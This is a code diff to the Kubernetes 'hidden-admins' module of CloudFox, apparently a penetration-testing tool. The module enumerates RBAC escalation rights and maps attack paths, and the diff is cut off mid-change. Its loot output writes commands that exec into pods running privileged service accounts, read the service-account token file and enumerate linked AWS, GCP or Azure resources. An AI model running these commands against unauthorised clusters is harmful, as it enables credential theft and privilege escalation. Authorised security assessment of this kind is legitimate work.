@@ -6,25 +6,27 @@ import (
 
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
-	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/BishopFox/cloudfox/kubernetes/sdk"
 	"github.com/BishopFox/cloudfox/kubernetes/shared"
 	"github.com/spf13/cobra"
+	rbacv1 "k8s.io/api/rbac/v1"
 )
 
 var HiddenAdminsCmd = &cobra.Command{
 	Use:   "hidden-admins",
-	Short: "Enumerate roles, users, groups, and service accounts with dangerous or escalatory permissions",
+	Short: "Enumerate entities with IAM/RBAC escalation permissions",
 	Long: `
-Identify hidden or dangerous administrators in a Kubernetes cluster. This includes:
+Identify hidden administrators with IAM/RBAC escalation capabilities. This includes:
   - Membership in system:masters group
-  - Cluster-admin permissions
-  - Ability to create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings
-  - Ability to create/update Secrets or ConfigMaps
-  - Impersonation rights
-  - RBAC aggregation roles
-  - Entities who can escalate privileges
+  - Cluster-admin or admin role bindings
+  - RBAC modification (create/update Roles, ClusterRoles, RoleBindings, ClusterRoleBindings)
+  - Impersonation rights (users, groups, service accounts)
+  - Certificate approval (CSR approval - create new cluster identities)
+  - RBAC aggregation roles (dynamically expandable permissions)
+
+For other privilege escalation paths (secrets, pod creation, exec, webhooks, nodes),
+use the 'privesc' command.
 
 Outputs detailed findings and attack paths:
   cloudfox kubernetes hidden-admins`,
@@ -36,7 +38,6 @@ type HiddenAdminFinding struct {
 	Entity         string
 	EntityType     string
 	Scope          string
-	RiskLevel      string
 	DangerousPerms string
 	Source         string
 	CloudIAM       string // AWS/GCP/Azure IAM role
@@ -50,7 +51,6 @@ type AttackPath struct {
 	EntityType  string
 	Steps       []string
 	EndGoal     string
-	RiskLevel   string
 	Feasibility string // "Immediate", "Requires-Enum", "Complex"
 }
 
@@ -59,24 +59,166 @@ type HiddenAdminsOutput struct {
 	Loot  []internal.LootFile
 }
 
-// Built-in dangerous roles with risk levels
-var dangerousBuiltInRoles = map[string]string{
-	"cluster-admin":                           shared.RiskCritical,
-	"admin":                                   shared.RiskHigh,
-	"edit":                                    shared.RiskMedium,
-	"system:masters":                          shared.RiskCritical,
-	"system:controller:deployment-controller": shared.RiskHigh,
-	"system:controller:replicaset-controller": shared.RiskHigh,
-	"system:controller:daemon-set-controller": shared.RiskHigh,
-	"system:controller:job-controller":        shared.RiskHigh,
-	"system:node":                             shared.RiskHigh,
-	"system:node-proxier":                     shared.RiskMedium,
-	"system:kube-controller-manager":          shared.RiskCritical,
-	"system:kube-scheduler":                   shared.RiskHigh,
+// Built-in dangerous roles
+var dangerousBuiltInRoles = map[string]bool{
+	"cluster-admin":                           true,
+	"admin":                                   true,
+	"edit":                                    true,
+	"system:masters":                          true,
+	"system:controller:deployment-controller": true,
+	"system:controller:replicaset-controller": true,
+	"system:controller:daemon-set-controller": true,
+	"system:controller:job-controller":        true,
+	"system:node":                             true,
+	"system:node-proxier":                     true,
+	"system:kube-controller-manager":          true,
+	"system:kube-scheduler":                   true,
 }
 
 func (h HiddenAdminsOutput) TableFiles() []internal.TableFile {
 	return h.Table
+}
+
+// appendUniqueHA appends a string to a slice only if it doesn't already exist (hidden-admins specific)
+func appendUniqueHA(slice []string, item string) []string {
+	for _, s := range slice {
+		if s == item {
+			return slice
+		}
+	}
+	return append(slice, item)
+}
+
+// containsHA checks if a slice contains an item (hidden-admins specific)
+func containsHA(slice []string, item string) bool {
+	for _, s := range slice {
+		if s == item {
+			return true
+		}
+	}
+	return false
+}
+
+// isIAMRelatedRule checks if a rule grants IAM/RBAC escalation permissions
+// This is specific to hidden-admins and excludes privesc paths like pod creation, secrets, etc.
+func isIAMRelatedRule(rule rbacv1.PolicyRule) bool {
+	// IAM/RBAC resources only
+	rbacResources := []string{"roles", "rolebindings", "clusterroles", "clusterrolebindings"}
+	impersonationResources := []string{"users", "groups", "serviceaccounts"}
+	certResources := []string{"certificatesigningrequests", "certificatesigningrequests/approval"}
+
+	modifyVerbs := []string{"create", "update", "patch", "delete", "*"}
+	rbacSpecialVerbs := []string{"bind", "escalate"}
+
+	for _, verb := range rule.Verbs {
+		verbLower := strings.ToLower(verb)
+
+		for _, res := range rule.Resources {
+			resLower := strings.ToLower(res)
+
+			// Wildcard on RBAC API group = dangerous
+			if resLower == "*" {
+				for _, apiGroup := range rule.APIGroups {
+					if apiGroup == "rbac.authorization.k8s.io" || apiGroup == "*" {
+						return true
+					}
+				}
+			}
+
+			// RBAC modification (roles, rolebindings, clusterroles, clusterrolebindings)
+			if containsHA(rbacResources, resLower) && containsHA(modifyVerbs, verbLower) {
+				return true
+			}
+
+			// RBAC special verbs (bind, escalate)
+			if containsHA(rbacResources, resLower) && containsHA(rbacSpecialVerbs, verbLower) {
+				return true
+			}
+
+			// Impersonation
+			if verbLower == "impersonate" && containsHA(impersonationResources, resLower) {
+				return true
+			}
+
+			// Certificate approval (creating new cluster identities)
+			if containsHA(certResources, resLower) {
+				if verbLower == "create" || verbLower == "update" || verbLower == "approve" || verbLower == "*" {
+					return true
+				}
+			}
+		}
+	}
+
+	return false
+}
+
+// getIAMRiskDescription returns a human-readable description of IAM/RBAC risks
+func getIAMRiskDescription(rule rbacv1.PolicyRule) string {
+	var descriptions []string
+
+	rbacResources := []string{"roles", "rolebindings", "clusterroles", "clusterrolebindings"}
+	impersonationResources := []string{"users", "groups", "serviceaccounts"}
+	certResources := []string{"certificatesigningrequests", "certificatesigningrequests/approval"}
+
+	modifyVerbs := []string{"create", "update", "patch", "delete"}
+	rbacSpecialVerbs := []string{"bind", "escalate"}
+
+	for _, verb := range rule.Verbs {
+		verbLower := strings.ToLower(verb)
+
+		// Wildcard verb on RBAC
+		if verbLower == "*" {
+			for _, res := range rule.Resources {
+				resLower := strings.ToLower(res)
+				if containsHA(rbacResources, resLower) {
+					descriptions = append(descriptions, fmt.Sprintf("wildcard verbs on %s", res))
+				}
+			}
+		}
+
+		for _, res := range rule.Resources {
+			resLower := strings.ToLower(res)
+
+			// Wildcard resources on RBAC API group
+			if resLower == "*" {
+				for _, apiGroup := range rule.APIGroups {
+					if apiGroup == "rbac.authorization.k8s.io" {
+						descriptions = append(descriptions, "wildcard resources on rbac.authorization.k8s.io")
+					}
+					if apiGroup == "*" {
+						descriptions = append(descriptions, "wildcard API groups (includes RBAC)")
+					}
+				}
+			}
+
+			// RBAC modification
+			if containsHA(rbacResources, resLower) && containsHA(modifyVerbs, verbLower) {
+				descriptions = append(descriptions, fmt.Sprintf("can %s %s (RBAC modification)", verb, res))
+			}
+
+			// RBAC special verbs
+			if containsHA(rbacResources, resLower) && containsHA(rbacSpecialVerbs, verbLower) {
+				descriptions = append(descriptions, fmt.Sprintf("can %s %s (RBAC escalation)", verb, res))
+			}
+
+			// Impersonation
+			if verbLower == "impersonate" && containsHA(impersonationResources, resLower) {
+				descriptions = append(descriptions, fmt.Sprintf("can impersonate %s", res))
+			}
+
+			// Certificate approval
+			if containsHA(certResources, resLower) {
+				if verbLower == "create" || verbLower == "update" || verbLower == "approve" || verbLower == "*" {
+					descriptions = append(descriptions, fmt.Sprintf("can %s certificates (create new identities)", verb))
+				}
+			}
+		}
+	}
+
+	if len(descriptions) == 0 {
+		return ""
+	}
+	return strings.Join(descriptions, "; ")
 }
 
 func (h HiddenAdminsOutput) LootFiles() []internal.LootFile {
@@ -123,8 +265,7 @@ func (h HiddenAdminFinding) ToTableRow() []string {
 
 func (h HiddenAdminFinding) Loot() string {
 	return fmt.Sprintf(
-		"[Hidden Admin Detection]\nRisk Level: %s\nNamespace: %s\nEntity: %s (%s)\nScope: %s\nSource: %s\nDangerous Permissions: %s\n",
-		h.RiskLevel,
+		"[Hidden Admin Detection]\nNamespace: %s\nEntity: %s (%s)\nScope: %s\nSource: %s\nDangerous Permissions: %s\n",
 		h.Namespace,
 		h.Entity,
 		h.EntityType,
@@ -153,14 +294,18 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 	var tableRows [][]string
 	var attackPaths []AttackPath
 
-	// Risk statistics tracking
-	riskCounts := shared.NewRiskCounts()
-
 	// Loot builder
 	loot := shared.NewLootBuilder()
 
-	// Hidden Admin Attack Paths section for individual findings
-	lootAdminsSection := loot.Section("Hidden-Admin-Attack-Paths")
+	// Track entities by IAM/RBAC permission type (focused on identity/access control)
+	type PermissionTracking struct {
+		ClusterAdmin        []string // Bound to cluster-admin or system:masters
+		RBACModification    []string // Can create/update roles/bindings
+		Impersonation       []string // Can impersonate users/groups/SAs
+		CertificateApproval []string // Can approve CSRs (create new identities)
+		AggregationRoles    []string // Uses RBAC aggregation
+	}
+	permTracking := &PermissionTracking{}
 
 	// Query all ServiceAccounts to detect cloud IAM annotations using cache
 	serviceAccountCloudIAM := make(map[string]map[string]string) // namespace -> sa name -> cloud IAM
@@ -216,57 +361,81 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 		logger.ErrorM(fmt.Sprintf("Error fetching ClusterRoles: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
 		return
 	}
+
+	// Map of ClusterRole name -> dangerous permissions findings
+	dangerousClusterRoles := make(map[string][]string)
+
 	for _, role := range clusterRoles {
 		var findings []string
-		highestRisk := ""
 
 		// Check if this is a built-in dangerous role
-		if builtInRisk, isBuiltInDangerous := dangerousBuiltInRoles[role.Name]; isBuiltInDangerous {
+		if _, isBuiltInDangerous := dangerousBuiltInRoles[role.Name]; isBuiltInDangerous {
 			findings = append(findings, fmt.Sprintf("Built-in dangerous role: %s", role.Name))
-			highestRisk = builtInRisk
 		}
 
 		if role.Name == "cluster-admin" {
 			findings = append(findings, "cluster-admin role (full cluster control)")
-			highestRisk = shared.RiskCritical
+			permTracking.ClusterAdmin = append(permTracking.ClusterAdmin, fmt.Sprintf("ClusterRole/%s", role.Name))
 		}
 		if strings.Contains(role.Name, "system:masters") {
 			findings = append(findings, "member of system:masters group")
-			highestRisk = shared.RiskCritical
+			permTracking.ClusterAdmin = append(permTracking.ClusterAdmin, fmt.Sprintf("ClusterRole/%s", role.Name))
 		}
 		if role.AggregationRule != nil && role.AggregationRule.ClusterRoleSelectors != nil && len(role.AggregationRule.ClusterRoleSelectors) > 0 {
 			findings = append(findings, "RBAC Aggregation role")
+			permTracking.AggregationRoles = appendUniqueHA(permTracking.AggregationRoles, fmt.Sprintf("ClusterRole/%s", role.Name))
 		}
 		if role.Rules != nil {
 			for _, rule := range role.Rules {
-				if k8sinternal.IsDangerousRule(rule) {
-					riskLevel := k8sinternal.GetRuleRiskLevel(rule)
-					riskDesc := k8sinternal.GetRuleRiskDescription(rule)
-					findings = append(findings, riskDesc)
+				// Only check for IAM/RBAC related rules, not privesc paths
+				if isIAMRelatedRule(rule) {
+					riskDesc := getIAMRiskDescription(rule)
+					if riskDesc != "" {
+						findings = append(findings, riskDesc)
+					}
 
-					// Track highest risk level
-					if highestRisk == "" || (riskLevel == shared.RiskCritical) || (riskLevel == shared.RiskHigh && highestRisk != shared.RiskCritical) {
-						highestRisk = riskLevel
+					// Track IAM/RBAC-related permissions
+					entityRef := fmt.Sprintf("ClusterRole/%s", role.Name)
+					for _, res := range rule.Resources {
+						resLower := strings.ToLower(res)
+						for _, verb := range rule.Verbs {
+							verbLower := strings.ToLower(verb)
+							// RBAC modification
+							if strings.Contains(resLower, "role") || strings.Contains(resLower, "rolebinding") || strings.Contains(resLower, "clusterrole") {
+								if verbLower == "create" || verbLower == "update" || verbLower == "patch" || verbLower == "*" || verbLower == "bind" || verbLower == "escalate" {
+									permTracking.RBACModification = appendUniqueHA(permTracking.RBACModification, entityRef)
+								}
+							}
+							// Certificate approval (identity creation)
+							if strings.Contains(resLower, "certificatesigningrequests") {
+								if verbLower == "create" || verbLower == "update" || verbLower == "approve" || verbLower == "*" {
+									permTracking.CertificateApproval = appendUniqueHA(permTracking.CertificateApproval, entityRef)
+								}
+							}
+						}
+						// Impersonation
+						for _, verb := range rule.Verbs {
+							if strings.ToLower(verb) == "impersonate" {
+								permTracking.Impersonation = appendUniqueHA(permTracking.Impersonation, entityRef)
+							}
+						}
 					}
 				}
 			}
 		}
 		if len(findings) > 0 {
-			if highestRisk == "" {
-				highestRisk = shared.RiskMedium
-			}
-			riskCounts.Add(highestRisk)
+			// Store findings for lookup when processing bindings
+			dangerousClusterRoles[role.Name] = findings
+
 			row := HiddenAdminFinding{
 				Namespace:      "<cluster>",
 				Entity:         role.Name,
 				EntityType:     "ClusterRole",
 				Scope:          "cluster",
-				RiskLevel:      highestRisk,
 				DangerousPerms: strings.Join(findings, "; "),
 				Source:         "ClusterRole definition",
 			}
 			tableRows = append(tableRows, row.ToTableRow())
-			lootAdminsSection.Add(row.Loot())
 		}
 	}
 
@@ -284,17 +453,17 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 					ns = "<cluster>"
 				}
 				role := binding.RoleRef.Name
-				riskLevel := ""
 				isWildcard := false
 				isDefault := false
 				cloudIAM := ""
 				activePods := 0
+				isDangerous := false
 
 				// Detect wildcard group bindings
 				if subject.Kind == "Group" {
 					if subject.Name == "system:serviceaccounts" {
 						isWildcard = true
-						riskLevel = shared.RiskCritical
+						isDangerous = true
 						// Create attack path for wildcard binding
 						attackPaths = append(attackPaths, AttackPath{
 							StartEntity: "system:serviceaccounts (ALL ServiceAccounts)",
@@ -305,13 +474,12 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 								"Full cluster-wide access through group membership",
 							},
 							EndGoal:     "Cluster-wide privilege escalation via any ServiceAccount",
-							RiskLevel:   shared.RiskCritical,
 							Feasibility: "Immediate",
 						})
 					} else if strings.HasPrefix(subject.Name, "system:serviceaccounts:") {
 						isWildcard = true
+						isDangerous = true
 						wildcardNS := strings.TrimPrefix(subject.Name, "system:serviceaccounts:")
-						riskLevel = shared.RiskHigh
 						// Create attack path for namespace wildcard binding
 						attackPaths = append(attackPaths, AttackPath{
 							StartEntity: fmt.Sprintf("system:serviceaccounts:%s (ALL SAs in %s)", wildcardNS, wildcardNS),
@@ -322,7 +490,6 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 								"Namespace-wide access to cluster-level permissions",
 							},
 							EndGoal:     fmt.Sprintf("Privilege escalation via any ServiceAccount in %s", wildcardNS),
-							RiskLevel:   shared.RiskHigh,
 							Feasibility: "Immediate",
 						})
 					}
@@ -331,12 +498,7 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 				// Detect default ServiceAccount elevations
 				if subject.Kind == "ServiceAccount" && subject.Name == "default" {
 					isDefault = true
-					// Escalate risk for default SA
-					if riskLevel == "" || riskLevel == shared.RiskMedium {
-						riskLevel = shared.RiskHigh
-					} else if riskLevel == shared.RiskHigh {
-						riskLevel = shared.RiskCritical
-					}
+					isDangerous = true
 					// Create attack path for default SA elevation
 					attackPaths = append(attackPaths, AttackPath{
 						StartEntity: fmt.Sprintf("default ServiceAccount (%s)", ns),
@@ -347,7 +509,6 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 							"All pods without explicit SA use this account",
 						},
 						EndGoal:     "Privilege escalation through implicit ServiceAccount",
-						RiskLevel:   riskLevel,
 						Feasibility: "Immediate",
 					})
 				}
@@ -366,7 +527,6 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 								"Compromise pod → K8s cluster access + Cloud IAM access",
 							},
 							EndGoal:     "Multi-cloud privilege escalation (K8s + Cloud Provider)",
-							RiskLevel:   shared.RiskCritical,
 							Feasibility: "Requires-Enum",
 						})
 					}
@@ -376,29 +536,36 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 				}
 
 				// Check built-in dangerous roles
-				if builtInRisk, isDangerous := dangerousBuiltInRoles[role]; isDangerous {
-					if riskLevel == "" || (builtInRisk == shared.RiskCritical) || (builtInRisk == shared.RiskHigh && riskLevel != shared.RiskCritical) {
-						riskLevel = builtInRisk
-					}
+				if _, isDangerousRole := dangerousBuiltInRoles[role]; isDangerousRole {
+					isDangerous = true
 				}
 
-				if role == "cluster-admin" || role == "system:masters" {
-					riskLevel = shared.RiskCritical
-				} else if role == "admin" || role == "edit" {
-					if riskLevel == "" {
-						riskLevel = shared.RiskHigh
-					}
+				if role == "cluster-admin" || role == "system:masters" || role == "admin" || role == "edit" {
+					isDangerous = true
 				}
 
-				if riskLevel != "" {
-					riskCounts.Add(riskLevel)
+				if isDangerous {
+					// Track entity with their bound role for playbook
+					entityRef := fmt.Sprintf("%s:%s/%s", subject.Kind, ns, subject.Name)
+					if role == "cluster-admin" || role == "system:masters" {
+						permTracking.ClusterAdmin = appendUniqueHA(permTracking.ClusterAdmin, entityRef)
+					}
+					if role == "admin" || role == "edit" {
+						permTracking.RBACModification = appendUniqueHA(permTracking.RBACModification, entityRef)
+					}
+
+					// Get actual dangerous permissions from the ClusterRole
+					dangerousPerms := fmt.Sprintf("bound to ClusterRole %s", role)
+					if roleFindings, ok := dangerousClusterRoles[role]; ok {
+						dangerousPerms = strings.Join(roleFindings, "; ")
+					}
+
 					row := HiddenAdminFinding{
 						Namespace:      ns,
 						Entity:         subject.Name,
 						EntityType:     subject.Kind,
 						Scope:          "cluster",
-						RiskLevel:      riskLevel,
-						DangerousPerms: fmt.Sprintf("bound to ClusterRole %s", role),
+						DangerousPerms: dangerousPerms,
 						Source:         fmt.Sprintf("ClusterRoleBinding %s", binding.Name),
 						CloudIAM:       cloudIAM,
 						ActivePods:     activePods,
@@ -406,7 +573,6 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 						IsWildcard:     isWildcard,
 					}
 					tableRows = append(tableRows, row.ToTableRow())
-					lootAdminsSection.Add(row.Loot())
 				}
 			}
 		}
@@ -432,39 +598,29 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 		}
 
 		var findings []string
-		highestRisk := ""
 
 		if role.Rules != nil {
 			for _, rule := range role.Rules {
-				if k8sinternal.IsDangerousRule(rule) {
-					riskLevel := k8sinternal.GetRuleRiskLevel(rule)
-					riskDesc := k8sinternal.GetRuleRiskDescription(rule)
-					findings = append(findings, riskDesc)
-
-					// Track highest risk level
-					if highestRisk == "" || (riskLevel == shared.RiskCritical) || (riskLevel == shared.RiskHigh && highestRisk != shared.RiskCritical) || (riskLevel == shared.RiskMedium && highestRisk != shared.RiskCritical && highestRisk != shared.RiskHigh) {
-						highestRisk = riskLevel
+				// Only check for IAM/RBAC related rules, not privesc paths
+				if isIAMRelatedRule(rule) {
+					riskDesc := getIAMRiskDescription(rule)
+					if riskDesc != "" {
+						findings = append(findings, riskDesc)
 					}
 				}
 			}
 		}
 		if len(findings) > 0 {
-			if highestRisk == "" {
-				highestRisk = shared.RiskMedium
-			}
-			riskCounts.Add(highestRisk)
 			dangerousRolesInNS[ns][role.Name] = findings
 			row := HiddenAdminFinding{
 				Namespace:      ns,
 				Entity:         role.Name,
 				EntityType:     "Role",
 				Scope:          "namespace",
-				RiskLevel:      highestRisk,
 				DangerousPerms: strings.Join(findings, "; "),
 				Source:         fmt.Sprintf("Role definition (%s)", role.Name),
 			}
 			tableRows = append(tableRows, row.ToTableRow())
-			lootAdminsSection.Add(row.Loot())
 		}
 	}
 
@@ -476,39 +632,30 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 			roleName := binding.RoleRef.Name
 			var isDangerousBinding bool
 			var bindingPerms string
-			var riskLevel string
 
 			// Check if it's a dangerous namespaced role
 			if dangerousRolesInNS[ns] != nil {
 				if findings, ok := dangerousRolesInNS[ns][roleName]; ok {
 					isDangerousBinding = true
 					bindingPerms = fmt.Sprintf("bound to Role %s with: %s", roleName, strings.Join(findings, "; "))
-					riskLevel = shared.RiskHigh
 				}
 			}
 
 			// Check if it's binding to a ClusterRole (which might be cluster-admin or other dangerous ClusterRole)
 			if binding.RoleRef.Kind == "ClusterRole" {
-				if roleName == "cluster-admin" || strings.Contains(roleName, "system:masters") {
+				// First check if this ClusterRole has known dangerous permissions
+				if roleFindings, ok := dangerousClusterRoles[roleName]; ok {
+					isDangerousBinding = true
+					bindingPerms = strings.Join(roleFindings, "; ")
+				} else if roleName == "cluster-admin" || strings.Contains(roleName, "system:masters") || roleName == "admin" || roleName == "edit" {
+					// Fallback for built-in dangerous roles not in our map
 					isDangerousBinding = true
 					bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
-					riskLevel = shared.RiskCritical
-				} else if roleName == "admin" {
-					isDangerousBinding = true
-					bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
-					riskLevel = shared.RiskHigh
-				} else if roleName == "edit" {
-					isDangerousBinding = true
-					bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
-					riskLevel = shared.RiskMedium
 				}
 			}
 
 			// Only add subjects if this is a dangerous binding
 			if isDangerousBinding {
-				if riskLevel == "" {
-					riskLevel = shared.RiskMedium
-				}
 				for _, subject := range binding.Subjects {
 					cloudIAM := ""
 					activePods := 0
@@ -517,12 +664,6 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 					// Detect default ServiceAccount in namespace bindings
 					if subject.Kind == "ServiceAccount" && subject.Name == "default" {
 						isDefault = true
-						// Escalate risk for default SA
-						if riskLevel == shared.RiskMedium {
-							riskLevel = shared.RiskHigh
-						} else if riskLevel == shared.RiskHigh {
-							riskLevel = shared.RiskCritical
-						}
 					}
 
 					// Get cloud IAM and pod count for ServiceAccounts
@@ -535,13 +676,11 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 						}
 					}
 
-					riskCounts.Add(riskLevel)
 					row := HiddenAdminFinding{
 						Namespace:      ns,
 						Entity:         subject.Name,
 						EntityType:     subject.Kind,
 						Scope:          "namespace",
-						RiskLevel:      riskLevel,
 						DangerousPerms: bindingPerms,
 						Source:         fmt.Sprintf("RoleBinding %s", binding.Name),
 						CloudIAM:       cloudIAM,
@@ -550,51 +689,59 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 						IsWildcard:     false,
 					}
 					tableRows = append(tableRows, row.ToTableRow())
-					lootAdminsSection.Add(row.Loot())
 				}
 			}
 		}
 	}
 
-	// Cross-reference ServiceAccounts with running pods
-	lootSAPodsSection := loot.Section("ServiceAccount-Pod-Mapping").SetHeader(`#####################################
-##### ServiceAccount to Pod Mapping
-#####################################
-#
-# Which pods are running with dangerous ServiceAccounts
-# This helps identify active attack vectors
-#`)
-
-	if globals.KubeContext != "" {
-		lootSAPodsSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
+	// Build a map of dangerous service accounts with their cloud IAM and permissions
+	type dangerousSAInfo struct {
+		CloudIAM    string
+		Permissions string
 	}
-
-	// Build a map of dangerous service accounts
-	dangerousSAs := make(map[string]map[string]string) // namespace -> sa -> risk level
+	dangerousSAs := make(map[string]map[string]dangerousSAInfo) // namespace -> sa -> info
 	for _, row := range tableRows {
-		// Extract namespace, entity, type, and risk level from table rows
-		if len(row) >= 5 {
+		if len(row) >= 6 {
 			ns := row[0]
 			entity := row[1]
 			entityType := row[2]
-			riskLevel := row[4]
+			perms := row[4]
+			cloudIAM := row[5]
 
 			if entityType == "ServiceAccount" {
 				if dangerousSAs[ns] == nil {
-					dangerousSAs[ns] = make(map[string]string)
+					dangerousSAs[ns] = make(map[string]dangerousSAInfo)
 				}
-				dangerousSAs[ns][entity] = riskLevel
+				dangerousSAs[ns][entity] = dangerousSAInfo{CloudIAM: cloudIAM, Permissions: perms}
 			}
 		}
 	}
 
-	// Query pods to find which ones use these dangerous SAs (using already cached pods)
-	hasPodsWithDangerousSA := false
+	// Build hidden-admin-location table rows
+	var locationRows [][]string
+
+	// ============================================
+	// LOOT FILE 1: Hidden-Admin-Exec
+	// Combines pod mapping and cloud IAM with specific exec commands
+	// ============================================
+	lootExecSection := loot.Section("Hidden-Admins-Exec").SetHeader(`#####################################
+##### Hidden Admins Exec Commands
+#####################################
+#
+# Direct exec commands to compromise pods running
+# with dangerous ServiceAccounts
+#`)
+
+	if globals.KubeContext != "" {
+		lootExecSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
+	}
+
+	// Query pods to find which ones use dangerous SAs
 	if len(dangerousSAs) > 0 {
 		for _, pod := range allPods {
 			ns := pod.Namespace
 			if _, exists := dangerousSAs[ns]; !exists {
-				continue // Skip pods in namespaces without dangerous SAs
+				continue
 			}
 
 			saName := pod.Spec.ServiceAccountName
@@ -602,283 +749,117 @@ func ListHiddenAdmins(cmd *cobra.Command, args []string) {
 				saName = "default"
 			}
 
-			if riskLevel, found := dangerousSAs[ns][saName]; found {
-				hasPodsWithDangerousSA = true
-				lootSAPodsSection.AddBlank()
-				lootSAPodsSection.Addf("# [%s] Pod: %s/%s uses dangerous ServiceAccount: %s", riskLevel, ns, pod.Name, saName)
-				lootSAPodsSection.Addf("# Node: %s, Status: %s", pod.Spec.NodeName, pod.Status.Phase)
-				lootSAPodsSection.Addf("kubectl exec -it %s -n %s -- /bin/sh", pod.Name, ns)
-				lootSAPodsSection.Add("# Inside pod, extract SA token: cat /var/run/secrets/kubernetes.io/serviceaccount/token")
+			if saInfo, found := dangerousSAs[ns][saName]; found {
+				// Add to location table
+				locationRows = append(locationRows, []string{
+					ns,
+					saName,
+					saInfo.Permissions,
+					saInfo.CloudIAM,
+					pod.Name,
+					pod.Spec.NodeName,
+				})
+
+				lootExecSection.AddBlank()
+				lootExecSection.Addf("## %s/%s (SA: %s)", ns, pod.Name, saName)
+				lootExecSection.Addf("# Node: %s | Permissions: %s", pod.Spec.NodeName, saInfo.Permissions)
+
+				if saInfo.CloudIAM != "" && saInfo.CloudIAM != "<NONE>" {
+					lootExecSection.Addf("# Cloud IAM: %s", saInfo.CloudIAM)
+				}
+
+				lootExecSection.Addf("kubectl exec -it %s -n %s -- /bin/sh", pod.Name, ns)
+				lootExecSection.Add("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
+
+				// Add cloud-specific commands
+				if strings.HasPrefix(saInfo.CloudIAM, "AWS:") {
+					lootExecSection.Add("aws sts get-caller-identity && aws s3 ls")
+				} else if strings.HasPrefix(saInfo.CloudIAM, "GCP:") {
+					lootExecSection.Add("gcloud auth list && gcloud projects list")
+				} else if strings.HasPrefix(saInfo.CloudIAM, "Azure:") {
+					lootExecSection.Add("az account show && az resource list")
+				}
 			}
 		}
-
-		if !hasPodsWithDangerousSA {
-			lootSAPodsSection.AddBlank()
-			lootSAPodsSection.Add("# No running pods found using dangerous ServiceAccounts")
-			lootSAPodsSection.Add("# This is good - dangerous SAs exist but aren't actively in use")
-		}
-	} else {
-		lootSAPodsSection.AddBlank()
-		lootSAPodsSection.Add("# No dangerous ServiceAccounts detected in findings")
 	}
 
-	// Build Attack Path Chains loot file
-	lootAttackPathsSection := loot.Section("Attack-Path-Chains").SetHeader(`#####################################
-##### Attack Path Chain Analysis
+	if len(locationRows) == 0 {
+		lootExecSection.AddBlank()
+		lootExecSection.Add("# No pods found running with dangerous ServiceAccounts")
+	}
+
+	// ============================================
+	// LOOT FILE 2: Attack-Path-Chains (entity-specific)
+	// ============================================
+	lootAttackPathsSection := loot.Section("Hidden-Admins-Attack-Path-Chains").SetHeader(`#####################################
+##### Hidden Admins Attack Path Chains
 #####################################
 #
-# Multi-step privilege escalation paths
-# Visualizes how attackers can chain permissions
+# Entity-specific privilege escalation paths
 #`)
 
 	if len(attackPaths) > 0 {
 		for i, path := range attackPaths {
 			lootAttackPathsSection.AddBlank()
-			lootAttackPathsSection.Addf("## Attack Path #%d [%s - %s]", i+1, path.RiskLevel, path.Feasibility)
-			lootAttackPathsSection.Addf("Start: %s (%s)", path.StartEntity, path.EntityType)
-			lootAttackPathsSection.AddBlank()
-			lootAttackPathsSection.Add("Steps:")
+			lootAttackPathsSection.Addf("## Path %d: %s", i+1, path.StartEntity)
+			lootAttackPathsSection.Addf("# Type: %s | Feasibility: %s", path.EntityType, path.Feasibility)
 			for stepNum, step := range path.Steps {
-				lootAttackPathsSection.Addf("  %d. %s", stepNum+1, step)
+				lootAttackPathsSection.Addf("#   %d. %s", stepNum+1, step)
 			}
-			lootAttackPathsSection.AddBlank()
-			lootAttackPathsSection.Addf("End Goal: %s", path.EndGoal)
-			lootAttackPathsSection.AddBlank()
-			lootAttackPathsSection.Add("---")
+			lootAttackPathsSection.Addf("# Goal: %s", path.EndGoal)
 		}
 	} else {
 		lootAttackPathsSection.AddBlank()
-		lootAttackPathsSection.Add("# No attack paths detected")
+		lootAttackPathsSection.Add("# No specific attack paths detected")
 	}
 
-	// Build Cloud IAM Crosswalk loot file
-	lootCloudIAMSection := loot.Section("Cloud-IAM-Crosswalk").SetHeader(`#####################################
-##### Cloud IAM Crosswalk Analysis
+	// ============================================
+	// LOOT FILE 3: Privilege-Escalation-Playbook
+	// Organized by permission type with specific entities
+	// ============================================
+	lootPlaybookSection := loot.Section("Hidden-Admins-Playbook").SetHeader(`#####################################
+##### Hidden Admins Playbook
 #####################################
 #
-# Kubernetes ServiceAccounts with Cloud IAM roles
-# Compromising these SAs gives BOTH K8s and Cloud access
+# Exploitation techniques organized by permission type
+# with specific entities that have these permissions
 #`)
 
 	if globals.KubeContext != "" {
-		lootCloudIAMSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
+		lootPlaybookSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
 	}
 
-	hasCloudIAM := false
-	for ns, saMap := range serviceAccountCloudIAM {
-		for saName, cloudRole := range saMap {
-			hasCloudIAM = true
-			podCount := 0
-			if serviceAccountPodCount[ns] != nil {
-				podCount = serviceAccountPodCount[ns][saName]
-			}
-
-			lootCloudIAMSection.AddBlank()
